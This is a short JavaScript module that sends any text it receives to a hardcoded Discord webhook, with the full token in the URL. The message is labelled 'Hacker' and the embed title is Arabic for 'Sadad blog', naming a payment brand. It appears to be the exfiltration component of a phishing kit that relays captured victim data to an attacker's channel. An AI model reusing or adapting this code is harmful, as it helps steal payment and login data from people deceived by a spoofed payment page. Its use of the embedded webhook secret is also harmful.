import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323843686056071220/urORE55yP_xVlhmTk3sfq-nZrcyBXLlqkJVL5qITHYzhOSBOYeLnLOS67oDACCkcF7mP",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
